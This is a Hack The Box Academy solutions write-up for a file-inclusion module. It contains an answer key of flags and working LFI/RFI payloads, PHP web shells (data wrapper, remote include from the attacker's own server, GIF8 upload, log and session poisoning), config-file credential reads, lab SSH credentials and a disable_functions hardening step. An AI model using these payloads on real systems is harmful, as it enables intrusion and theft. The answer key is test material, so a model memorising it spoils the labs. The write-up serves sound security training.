| Section | Question Number | Answer |
| --- | --- | --- |
| Local File Inclusion (LFI) | Question 1 | barry |
| Local File Inclusion (LFI) | Question 2 | HTB{n3v3r\_tru$t\_u$3r\_!nput} |
| Basic Bypasses | Question 1 | HTB{64$!c\_f!lt3r$*w0nt*$t0p\_lf!} |
| PHP Filters | Question 1 | HTB{n3v3r\_$t0r3\_pl4!nt3xt\_cr3d$} |
| PHP Wrappers | Question 1 | HTB{d!$46l3\_r3m0t3\_url\_!nclud3} |
| Remote File Inclusion (RFI) | Question 1 | 99a8fc05f033f2fc0cf9a6f9826f83f4 |
| LFI and File Uploads | Question 1 | HTB{upl04d+lf!+3x3cut3=rc3} |
| Log Poisoning | Question 1 | /var/www/html |
| Log Poisoning | Question 2 | HTB{1095\_5#0u1d\_n3v3r\_63\_3xp053d} |
| Automated Scanning | Question 1 | HTB{4u70m47!0n\_f!nd5\_#!dd3n\_93m5} |
| File Inclusion Prevention | Question 1 | /etc/php/7.4/apache2/php.ini |
| File Inclusion Prevention | Question 2 | security |
| Skills Assessment - File Inclusion | Question 1 | a9a892dbc9faf9a014f58e007721835e |

## Acronyms Used in Writeups

| Acronym | Meaning |
| --- | --- |
| STMIP | Spawned Target Machine IP Address |
| STMPO | Spawned Target Machine Port |
| PMVPN | Personal Machine with a Connection to the Academy's VPN |
| PWNIP | Pwnbox IP Address (or PMVPN IP Address) |
| PWNPO | Pwnbox Port (or PMVPN Port) |

# Local File Inclusion (LFI)

## Question 1

### "Using the file inclusion find the name of a user on the system that starts with "b"."

Many approaches can be taken to solve this question.

A first approach is whereby students use `cURL` through the command line to exploit the file inclusion vulnerability and retrieve the contents of the `/etc/passwd` file, then subsequently use `grep` to filter out the answer:

Code: shell

```shell
curl -s "http://STMIP:STMPO/index.php?language=../../../../etc/passwd" | grep ^b
```

```
┌─[eu-academy-2]─[10.10.14.227]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ curl -s "http://64.227.39.88:32225/index.php?language=../../../../etc/passwd" | grep ^b

bin:x:2:2:bin:/bin:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
barry:x:1000:1000::/home/barry:/bin/bash
```

A second approach is a manual one, whereby students use the browser only, visiting and viewing the source of the webpage to attain the answer `barry`:

```
view-source:http://STMIP:STMPO/basic/index.php?language=../../../../etc/passwd
```

![[HTB Solutions/CPTS/z. images/17fd4662c949edeef8c51eb48f516255_MD5.jpg]]

Answer: `barry`

# Local File Inclusion (LFI)

## Question 2

### "Submit the contents of the flag.txt file located in the /usr/share/flags directory."

Students need to use a payload that exploits the path traversal vulnerability to read the contents of the file "flag.txt" located in `/usr/share/flags/flag.txt`:

```
http://STMIP:STMPO/index.php?language=../../../../usr/share/flags/flag.txt
```

![[HTB Solutions/CPTS/z. images/da9b0131231d7695ccc46783433756fa_MD5.jpg]]

Alternatively, students can use `cURL` and pipe its output to `grep` to filter the answer `HTB{n3v3r_tru$t_u$3r_!nput}` out:

Code: shell

```shell
curl -s "http://STMIP:STMPO/index.php?language=../../../../usr/share/flags/flag.txt" | grep "HTB"
```

```
curl -s "http://STMIP:STMPO/index.php?language=../../../../usr/share/flags/flag.txt" | grep "HTB" 

HTB{n3v3r_tru$t_u$3r_!nput}
```

Answer: `HTB{n3v3r_tru$t_u$3r_!nput}`

# Basic Bypasses

## Question 1

### "The above web application employs more than one filter to avoid LFI exploitation. Try to bypass these filters to read /flag.txt"

The web application of the spawned target machine does not recursively remove `../` since it applies a non-recursive path traversal filter. Using the browser, students can bypass the filter by using a recursive LFI payload such as `....//`:

```
http://STMIP:STMPO/index.php?language=languages/....//....//....//....//....//flag.txt
```

![[HTB Solutions/CPTS/z. images/c0daf692bb4ef8cfdb9aebb4bdea3596_MD5.jpg]]

Alternatively, students can use `cURL` with a different recursive LFI payload `..././` and then filter out the flag `HTB{64$!c_f!lt3r$_w0nt_$t0p_lf!}` using `grep`:

Code: shell

```shell
curl -s 'http://STMIP:STMPO/index.php?language=languages/..././..././..././..././..././flag.txt' | grep 'HTB'
```

```
┌─[us-academy-1]─[10.10.14.67]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ curl -s 'http://159.65.81.40:30593/index.php?language=languages/..././..././..././..././..././flag.txt' | grep 'HTB'

HTB{64$!c_f!lt3r$_w0nt_$t0p_lf!}
```

Answer: `HTB{64$!c_f!lt3r$_w0nt_$t0p_lf!}`

# PHP Filters

## Question 1

### "Fuzz the web application for other php scripts, and then read one of the configuration files and submit the database password as the answer"

Students first need to use `Ffuf` to fuzz for `.php` scripts/files on the spawned target machine website's root page:

Code: shell

```shell
ffuf -s -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://STMIP:STMPO/FUZZ.php
```

```
┌─[us-academy-1]─[10.10.14.67]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ffuf -s -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://134.209.186.158:30757/FUZZ.php

en
es
index
configure
```

Out of the four, `configure.php` seems to be the most useful/juicy since it might contain configuration settings, thus, students need to use the `convert.base64-encode` filter to retrieve the contents of the file as base64:

```
http://STMIP:STMPO/index.php?language=php://filter/read=convert.base64-encode/resource=configure
```

![[HTB Solutions/CPTS/z. images/ec05f4fedea5d06c85ffa93c5140a1ad_MD5.jpg]]

At last, students need to decode the base64 string, to find the flag as the value of `DB_PASSWORD`, which is `HTB{n3v3r_$t0r3_pl4!nt3xt_cr3d$}`:

Code: shell

```shell
echo -n 'PD9waHAKCmlmICgkX1NFUlZFUlsnUkVRVUVTVF9NRVRIT0QnXSA9PSAnR0VUJyAmJiByZWFscGF0aChfX0ZJTEVfXykgPT0gcmVhbHBhdGgoJF9TRVJWRVJbJ1NDUklQVF9GSUxFTkFNRSddKSkgewogIGhlYWRlcignSFRUUC8xLjAgNDAzIEZvcmJpZGRlbicsIFRSVUUsIDQwMyk7CiAgZGllKGhlYWRlcignbG9jYXRpb246IC9pbmRleC5waHAnKSk7Cn0KCiRjb25maWcgPSBhcnJheSgKICAnREJfSE9TVCcgPT4gJ2RiLmlubGFuZWZyZWlnaHQubG9jYWwnLAogICdEQl9VU0VSTkFNRScgPT4gJ3Jvb3QnLAogICdEQl9QQVNTV09SRCcgPT4gJ0hUQntuM3Yzcl8kdDByM19wbDQhbnQzeHRfY3IzZCR9JywKICAnREJfREFUQUJBU0UnID0+ICdibG9nZGInCik7CgokQVBJX0tFWSA9ICJBd2V3MjQyR0RzaHJmNDYrMzUvayI7' | base64 -d
```

```
┌─[us-academy-1]─[10.10.14.67]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ echo -n 'PD9waHAKCmlmICgkX1NFUlZFUlsnUkVRVUVTVF9NRVRIT0QnXSA9PSAnR0VUJyAmJiByZWFscGF0aChfX0ZJTEVfXykgPT0gcmVhbHBhdGgoJF9TRVJWRVJbJ1NDUklQVF9GSUxFTkFNRSddKSkgewogIGhlYWRlcignSFRUUC8xLjAgNDAzIEZvcmJpZGRlbicsIFRSVUUsIDQwMyk7CiAgZGllKGhlYWRlcignbG9jYXRpb246IC9pbmRleC5waHAnKSk7Cn0KCiRjb25maWcgPSBhcnJheSgKICAnREJfSE9TVCcgPT4gJ2RiLmlubGFuZWZyZWlnaHQubG9jYWwnLAogICdEQl9VU0VSTkFNRScgPT4gJ3Jvb3QnLAogICdEQl9QQVNTV09SRCcgPT4gJ0hUQntuM3Yzcl8kdDByM19wbDQhbnQzeHRfY3IzZCR9JywKICAnREJfREFUQUJBU0UnID0+ICdibG9nZGInCik7CgokQVBJX0tFWSA9ICJBd2V3MjQyR0RzaHJmNDYrMzUvayI7' | base64 -d

<?php
<SNIP>
$config = array(
  'DB_HOST' => 'db.inlanefreight.local',
  'DB_USERNAME' => 'root',
  'DB_PASSWORD' => 'HTB{n3v3r_$t0r3_pl4!nt3xt_cr3d$}',
  'DB_DATABASE' => 'blogdb'
);

$API_KEY = "Awew242GDshrf46+35/k";
```

Answer: `HTB{n3v3r_$t0r3_pl4!nt3xt_cr3d$}`

# PHP Wrappers

## Question 1

### "Try to gain RCE using one of the PHP wrappers and read the flag at /"

Many approaches can be taken to solve this question.

A first approach is whereby students use the `data` wrapper to include a PHP web shell. But first, to determine whether the `allow_url_include` setting is enabled, students need to check the PHP configuration file of the `Apache` server using the `convert.base64-encode` filter:

```
http://STMIP:STMPO/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini
```

![[HTB Solutions/CPTS/z. images/85676bc89cf23460379578ccea313b82_MD5.jpg]]

The base64-encoded string is extremely large, thus, using some Linux-Fu, students are encouraged to filter out all HTML tags (using `grep` and `sed`) to remain with the base64-encoded string only, and then save it to a file for easier usage afterwards (instead of just copying and pasting the string manually):

Code: shell

```shell
curl -s 'http://STMIP:STMPO/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini' | grep "W1BI" | sed 's/ \{12\}//g' | sed 's/<p class="read-more">//g' > configBase64.txt
```

```
┌─[us-academy-1]─[10.10.14.3]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ curl -s 'http://46.101.81.30:30918/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini' | grep "W1BI" | sed 's/ \{12\}//g' | sed 's/<p class="read-more">//g' > configBase64.txt
```

Students then need to decode the base64-encoded string and use `grep` to filter for the `allow_url_include` option:

Code: shell

```shell
cat configBase64.txt | base64 -d | grep 'allow_url_include'
```

```
┌─[us-academy-1]─[10.10.14.3]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ cat configBase64.txt | base64 -d | grep 'allow_url_include'

allow_url_include = On
```

Since this option is enabled, the `data` wrapper can be used. Students first need to base64-encode a basic PHP web shell:

Code: shell

```shell
echo '<?php system($_GET["cmd"]); ?>' | base64
```

```
┌─[us-academy-1]─[10.10.14.3]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ echo '<?php system($_GET["cmd"]); ?>' | base64

PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```

Students now need to URL-encode the base64-encoded web shell, which can be achieved via Python3 (or by using `cURL` itself, as with the `--data-urlencode` flag, or with any online website such as [urlencoder](https://www.urlencoder.org/)):

Code: shell

```shell
python3 -c 'import urllib.parse;print(urllib.parse.quote_plus("PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg=="))'
```

```
┌─[us-academy-1]─[10.10.14.3]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ python3 -c 'import urllib.parse;print(urllib.parse.quote("PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg=="))'

PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D
```

And then, students need to pass it to the `data` wrapper with `data://text/plain;base64,`, passing commands as the value for the `cmd` URL-parameter. First, `ls` will be used on the root directory `/` to view the files there (`grep` is also used to take out anything that is an HTML tag from the response returned by `cURL`):

Code: shell

```shell
curl -s 'http://STMIP:STMPO/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=ls+/' | grep -v "<.*>"
```

```
┌─[us-academy-1]─[10.10.14.3]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ curl -s 'http://46.101.81.30:30980/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=ls+/' | grep -v "<.*>"

37809e2f8952f06139011994726d9ef1.txt
bin
boot
dev
etc
home
<SNIP>
```

The first file `37809e2f8952f06139011994726d9ef1.txt` seems to contain the flag, thus, students need to use the `cat` command on it:

Code: shell

```shell
curl -s 'http://STMIP:STMPO/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=cat+/37809e2f8952f06139011994726d9ef1.txt' | grep -v "<.*>"
```

```
┌─[us-academy-1]─[10.10.14.3]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ curl -s 'http://46.101.81.30:30980/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=cat+/37809e2f8952f06139011994726d9ef1.txt' | grep -v "<.*>"

HTB{d!$46l3_r3m0t3_url_!nclud3}
```

Answer: `HTB{d!$46l3_r3m0t3_url_!nclud3}`

# Remote File Inclusion (RFI)

## Question 1

### "Attack the target, gain command execution by exploiting the RFI vulnerability, and then look for the flag under one of the directories in /"

Students first need to create a PHP web shell which they will invoke/include later when exploiting the RFI vulnerability:

Code: php

```php
<?php system($_GET['cmd']); ?>
```

Code: shell

```shell
cat << 'EOF' > webShell.php
<?php system($_GET['cmd']); ?>
EOF
```

```
┌─[us-academy-1]─[10.10.14.4]─[htb-ac413848@pwnbox-base]─[~]
└──╼ cat << 'EOF' > webShell.php
> <?php system($_GET['cmd']); ?>
> EOF
```

Then, students need to start an HTTP server on `Pwnbox`/`PMVPN` (in the same directory where the PHP web shell exists) to listen and respond to requests from the spawned target machine (it is important that students make sure the firewall on `PMVPN` is not denying/rejecting incoming connections):

Code: shell

```shell
python3 -m http.server
```

```
┌─[us-academy-1]─[10.10.14.4]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ python3 -m http.server

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Subsequently, students will exploit the RFI vulnerability and list all the files in the root directory (`PWNIP` here is the IP address of the interface `tun0`, students can use the command `ip a | grep 'tun0'` to find out the IP address):

Code: shell

```shell
curl -w "\n" -s 'http://STMIP/index.php?language=http://PWNIP:8000/webShell.php&cmd=ls+/' | grep -v "<.*>"
```

```
┌──[us-academy-1]─[10.10.14.4]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ curl -w "\n" -s 'http://10.129.29.114/index.php?language=http://10.10.14.4:8000/webShell.php&cmd=ls+/' | grep -v "<.*>"

bin
boot
dev
etc
exercise
<SNIP>
```

The `/exercise/` directory seems promising, thus, students need to list its contents:

Code: shell

```shell
curl -w "\n" -s 'http://STMIP/index.php?language=http://PWNIP:PWNPO/webShell.php&cmd=ls+/exercise/' | grep -v "<.*>"
```

```
┌─[us-academy-1]─[10.10.14.4]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ curl -w "\n" -s 'http://10.129.29.114/index.php?language=http://10.10.14.4:8000/webShell.php&cmd=ls+/exercise/' | grep -v "<.*>"

flag.txt
```

The flag exists in the `/exercise/` directory, therefore at last, students need to print its content:

Code: shell

```shell
curl -w "\n" -s 'http://STMIP/index.php?language=http://PWNIP:PWNPO/webShell.php&cmd=cat+/exercise/flag.txt' | grep -v "<.*>"
```

```
┌─[us-academy-1]─[10.10.14.4]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ curl -w "\n" -s 'http://10.129.29.114/index.php?language=http://10.10.14.4:8000/webShell.php&cmd=cat+/exercise/flag.txt' | grep -v "<.*>"

99a8fc05f033f2fc0cf9a6f9826f83f4
```

Answer: `99a8fc05f033f2fc0cf9a6f9826f83f4`

# LFI and File Uploads

## Question 1

### "Use any of the techniques covered in this section to gain RCE and read the flag at /"

Students can use any of the three techniques mentioned in the module's section. The `Image Upload` (i.e., first technique) will be used to solve this question.

Students first need to create a PHP web shell that has the `GIF8` image magic byte at the beginning of it, and save it to a file with the `.gif` extension:

Code: shell

```shell
cat << 'EOF' > shell.gif
GIF8<?php system($_GET['cmd']); ?>
EOF
```

```
┌─[us-academy-1]─[10.10.14.42]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ cat << 'EOF' > shell.gif
> GIF8<?php system($_GET['cmd']); ?>
> EOF
┌─[us-academy-1]─[10.10.14.42]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ file shell.gif

shell.gif: GIF image data 26736 x 8304
```

Then, students need to upload the malicious image file by navigating to `http://STMIP:STMPO/settings.php`, clicking on the "image" icon to choose the file, and then clicking on "Upload":

![[HTB Solutions/CPTS/z. images/e07620b12cb3d4d5efdd9322248fec69_MD5.jpg]]

![[HTB Solutions/CPTS/z. images/ee1a947cc16cb0a44521a4c3a10c857d_MD5.jpg]]

After the malicious image has been uploaded successfully, students need to view the page source to notice that on line 29, the uploaded file path is `/profile_images/shell.gif`:

![[HTB Solutions/CPTS/z. images/6ee2e44222a11c11417f7d438d8519b6_MD5.jpg]]

Now, remote code execution is possible; students need to use the `ls` command to list the contents at the root directory `/`:

Code: shell

```shell
curl -s -w "\n" 'http://STMIP:STMPO/index.php?language=./profile_images/shell.gif&cmd=ls+/' | grep -v "<.*>"
```

```
┌─[us-academy-1]─[10.10.14.42]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ curl -s -w "\n" 'http://165.22.122.134:30504/index.php?language=./profile_images/shell.gif&cmd=ls+/' | grep -v "<.*>"

GIF82f40d853e2d4768d87da1c81772bae0a.txt
bin
boot
dev
etc
home
<SNIP>
```

The first file holds the flag, however, students need to remove `GIF8` from the beginning of it and use the `cat` command on it:

Code: shell

```shell
curl -s 'http://STMIP:STMPO/index.php?language=./profile_images/shell.gif&cmd=cat+/2f40d853e2d4768d87da1c81772bae0a.txt' | grep -v "<.*>"
```

```
┌─[us-academy-1]─[10.10.14.42]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ curl -s 'http://165.22.122.134:30504/index.php?language=./profile_images/shell.gif&cmd=cat+/2f40d853e2d4768d87da1c81772bae0a.txt' | grep -v "<.*>"

GIF8HTB{upl04d+lf!+3x3cut3=rc3}
```

The printed string also has `GIF8` at the beginning of it, thus, students need to remove it before submitting the flag `HTB{upl04d+lf!+3x3cut3=rc3}`.

Answer: `HTB{upl04d+lf!+3x3cut3=rc3}`

# Log Poisoning

## Question 1

### "Use any of the techniques covered in this section to gain RCE, then submit the output of the following command: pwd"

Students need to either start with the `PHP Session Poisoning` technique or `Server Log Poisoning`.

Starting with the former method, students need to examine the `PHPSESSID` session file and see if it contains any data that can be controlled and poisoned. To do so, students need to know the `PHPSESSID` cookie value, which can be attained via the Web Developer Tools of a browser:

![[HTB Solutions/CPTS/z. images/7a7114fc8e6eb3c5b2047736cf723dbe_MD5.jpg]]

The `PHPSESSID` cookie value is `iic5bp46saajhe9jtshind2vsh`, thus, it should be stored at `/var/lib/php/sessions/sess_iic5bp46saajhe9jtshind2vsh` on the back-end server. Students then need to include the session file through the LFI vulnerability to view its contents:

```
http://STMIP:STMPO/index.php?language=/var/lib/php/sessions/sess_iic5bp46saajhe9jtshind2vsh
```

![[HTB Solutions/CPTS/z. images/01be2d935ec13c1301b999cade5769b4_MD5.jpg]]

Afterward, students need to try to poison the session file and then include it through the LFI vulnerability to view its contents and whether the value of `page` has been changed:

```
http://STMIP:STMPO/index.php?language=poisonTest
```

![[HTB Solutions/CPTS/z. images/a79738126ca7fae0d5958d8eb910037b_MD5.jpg]]

The session file was poisoned with the string "poisonTest" successfully, thus, students now need to poison it with a basic URL-encoded PHP web shell to attain remote code execution on the spawned target machine:

```
http://STMIP:STMPO/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```

At last, students need to execute the `pwd` command by passing it to the `cmd` URL parameter to attain the flag `/var/www/html`:

```
http://STMIP:STMPO/index.php?language=/var/lib/php/sessions/sess_iic5bp46saajhe9jtshind2vsh&cmd=pwd
```

![[HTB Solutions/CPTS/z. images/79c03e39e95c2de9c9537be5c8961485_MD5.jpg]]

Answer: `/var/www/html`

# Log Poisoning

## Question 2

### "Try to use a different technique to gain RCE and read the flag at /"

Students here need to use the second technique which is `Server Log Poisoning`.

First, students need to determine whether the web server running on the back-end is `Apache` or `Nginx`. When including the `access.log` file of `Apache` through the LFI vulnerability its output is returned:

```
http://STMIP:STMPO/index.php?language=/var/log/apache2/access.log
```

![[HTB Solutions/CPTS/z. images/f339388b4ae890a9440ee7b317771a21_MD5.jpg]]

Thus, `Apache` is running on the back-end server. Students now need to poison the `User-Agent` header. To do so, students need to use an intercepting proxy such as Burp Suite to capture the request that includes the `Apache` log file through the LFI vulnerability and poison the `User-Agent` header to be a PHP web shell:

Code: php

```php
<?php system($_GET['cmd']); ?>
```

![[HTB Solutions/CPTS/z. images/f88c35cc7c626dae43d09f2b2163a437_MD5.jpg]]

After forwarding the poisoned request, students can execute commands, then, they need to list the files at the root directory `/`:

```
GET /index.php?language=/var/log/apache2/access.log&cmd=ls+/ HTTP/1.1
```

![[HTB Solutions/CPTS/z. images/6132c3d9943dbeb897ebcf0fbc92b9e9_MD5.jpg]]

The name of the file containing the flag is `c85ee5082f4c723ace6c0796e3a3db09.txt`, therefore, students need to print its contents to attain the flag `HTB{1095_5#0u1d_n3v3r_63_3xp053d}`:

```
GET /index.php?language=/var/log/apache2/access.log&cmd=cat+/c85ee5082f4c723ace6c0796e3a3db09.txt
```

![[HTB Solutions/CPTS/z. images/7ad142268ce831694dce0b7d043a7e74_MD5.jpg]]

Answer: `HTB{1095_5#0u1d_n3v3r_63_3xp053d}`

# Automated Scanning

## Question 1

### "Fuzz the web application for exposed parameters, then try to exploit it with one of the LFI wordlists to read /flag.txt"

First, students need to use `Ffuf` to fuzz for common GET parameters, however, the response size of erroneous requests must be determined to subsequently be filtered. Identifying the response size of an erroneous request can be easily achieved by running `Ffuf` without response size filtering and noticing the size of the responses:

Code: shell

```shell
ffuf -w /usr/share/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://STMIP:STMPO/index.php?FUZZ=key'
```

```
┌─[us-academy-1]─[10.10.14.42]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ffuf -w /usr/share/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://159.65.27.79:31737/index.php?FUZZ=key'

post                    [Status: 200, Size: 2309, Words: 571, Lines: 56]
p                       [Status: 200, Size: 2309, Words: 571, Lines: 56]
file                    [Status: 200, Size: 2309, Words: 571, Lines: 56]
key                     [Status: 200, Size: 2309, Words: 571, Lines: 56]
debug                   [Status: 200, Size: 2309, Words: 571, Lines: 56]
<SNIP>
```

The response size is `2309` for all of the responses, thus, students now need to filter out this response size by using the `-fs` flag:

Code: shell

```shell
ffuf -w /usr/share/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://STMIP:STMPO/index.php?FUZZ=key' -fs 2309
```

```
┌─[us-academy-1]─[10.10.14.42]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ffuf -w /usr/share/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://159.65.27.79:31737/index.php?FUZZ=key' -fs 2309

view [Status: 200, Size: 1935, Words: 515, Lines: 56]
:: Progress: [2588/2588] :: Job [1/1] :: 6221 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```

`view` is a valid GET parameter. Thus, students now need to use the [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) LFI wordlist to fuzz for LFI payloads. Similar to fuzzing for common GET parameters, the response size of erroneous requests must be determined to subsequently get filtered:

Code: shell

```shell
ffuf -w /usr/share/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://STMIP:STMPO/index.php?view=FUZZ'
```

```
┌─[us-academy-1]─[10.10.14.42]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ffuf -w /usr/share/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://159.65.27.79:31737/index.php?view=FUZZ'

/.../.../.../.../.../   [Status: 200, Size: 1935, Words: 515, Lines: 56]
%00../../../../../../etc/passwd [Status: 200, Size: 1935, Words: 515, Lines: 56]
%00/etc/passwd%00       [Status: 200, Size: 1935, Words: 515, Lines: 56]
/apache/logs/error.log  [Status: 200, Size: 1935, Words: 515, Lines: 56]
<SNIP>
```

The response size is `1935` for any of the erroneous requests, thus, students need to filer out this response size:

Code: shell

```shell
ffuf -w /usr/share/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://STMIP:STMPO/index.php?view=FUZZ' -fs 1935
```

```
┌─[us-academy-1]─[10.10.14.42]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ffuf -w /usr/share/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://159.65.27.79:31737/index.php?view=FUZZ' -fs 1935

../../../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82]
../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82]
../../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82]
../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82]
../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82]
../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82]
:: Progress: [870/870] :: Job [1/1] :: 863 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
```

Students at last can use any of the LFI payloads returned by `Ffuf` to read the flag, one example would be using the last payload (which has the least amount of `../`):

```
http://STMIP:STMPO/?view=../../../../../../../../../../../../../../../../../flag.txt
```

![[HTB Solutions/CPTS/z. images/e199901d7e754bc319da642ea3ccc3b6_MD5.jpg]]

Answer: `HTB{4u70m47!0n_f!nd5_#!dd3n_93m5}`

# File Inclusion Prevention

## Question 1

### "What is the full path to the php.ini file for Apache?"

Students first need to SSH into the spawned target machine using the credentials `htb-student:HTB_@cademy_stdnt!`:

Code: shell

```shell
ssh htb-student@STMIP
```

```
┌─[us-academy-1]─[10.10.14.169]─[htb-ac413848@htb-co8vkqsbet]─[~]
└──╼ [★]$ ssh htb-student@10.129.29.112

The authenticity of host '10.129.29.112 (10.129.29.112)' can't be established.
ECDSA key fingerprint is SHA256:9+kS921cMi3Ewl3ZoHPei3saVgPGC5oQv5/SsV4DBB4.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.29.112' (ECDSA) to the list of known hosts.

htb-student@10.129.29.112's password: 

Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-52-generic x86_64)

<SNIP>

htb-student@lfi-harden:~$
```

Then, students need to run as root -which has the same password as the normal user- the `find` command and specify `php.ini` as the name of the file being searched for:

Code: shell

```shell
sudo find / -name php.ini
```

```
htb-student@lfi-harden:~$ sudo find / -name php.ini

/etc/php/7.4/cli/php.ini 
/etc/php/7.4/apache2/php.ini
```

The first path specifies the file for the `CLI` PHP program. However, the second path specifies the path for the PHP plugin used by the `Apache` web server. Thus, the second path, `/etc/php/7.4/apache2/php.ini`, is the correct answer.

Answer: `/etc/php/7.4/apache2/php.ini`

# File Inclusion Prevention

## Question 2

### "Edit the php.ini file to block system(), then try to execute PHP Code that uses system. Read the /var/log/apache2/error.log file and fill in the blank: system() has been disabled for \_\_\_\_\_\_\_\_\_ reasons."

Utilizing the same SSH connection established in the previous question, students for the first part of this question first need to edit the file `/etc/php/7.4/apache2/php.ini` by going to line 312, and making the `disable_functions` directive to be:

```
disable_functions=exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source
```

![[HTB Solutions/CPTS/z. images/a8d11155150b085399a263505b93c221_MD5.jpg]]

Then, students need to restart `Apache`:

Code: shell

```shell
sudo service apache2 restart
```

```
htb-student@lfi-harden:/var/www/html$ sudo service apache2 restart
```

Subsequently, students need to make a web shell named "shell.php" in `/var/www/html/` as root (supplying the password `HTB_@cademy_stdnt!` when prompted for it):

Code: shell

```shell
sudo su -
echo "<?php system('id'); ?>" > /var/www/html/shell.php
```

```
htb-student@lfi-harden:/var/www/html$ sudo su -

[sudo] password for htb-student: 
root@lfi-harden:/var/www/html# echo "<?php system('id'); ?>" > /var/www/html/shell.php
```

Students then need to use `tail` with the `follow` flag (`-f`) on the file `/var/log/apache2/error.log`:

Code: shell

```shell
sudo tail -f /var/log/apache2/error.log
```

```
htb-student@lfi-harden:/var/www/html$ sudo tail -f /var/log/apache2/error.log
```

![[HTB Solutions/CPTS/z. images/3c46428bef930027cc2e6a84253c633f_MD5.jpg]]

At last, students need to use a browser and navigate to `http://STMIP/shell.php` from `Pwnbox`/`PMVPN`, and notice the change that takes place in the `/var/log/apache2/error.log` file:

![[HTB Solutions/CPTS/z. images/4dc3ba4895c17f082f94fae7ca4c2afe_MD5.jpg]]

The warning message reads:

```
[php7:warn] [pid 1834] [client 10.10.14.32:32890] PHP Warning:  system() has been disabled for security reasons in /var/www/html/shell.php on line 1
```

For the second part of the question, students need to go to line 312 in the `/etc/php/7.4/apache2/php.ini` file and read the comments above the `disable_functions` directive:

```
; This directive allows you to disable certain functions for security reasons<br>
; It receives a comma-delimited list of function names.<br>
; [http://php.net/disable-functions](http://php.net/disable-functions "http://php.net/disable-functions")
```

Answer: `security`

# Skills Assessment - File Inclusion

## Question 1

### "Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the / root directory of the file system. Submit the contents of the flag as your answer."

After spawning the target machine, students need to navigate to its website's root page and notice that when hovering over a hyperlink, the content is fetched via the `page` URL parameter:

![[HTB Solutions/CPTS/z. images/343b12faf2b0fb39f8436e517c6bf75f_MD5.jpg]]

Therefore, students need to use PHP filters to read the source code of the `index` page, such as with the `convert.base64-encode` filter:

```
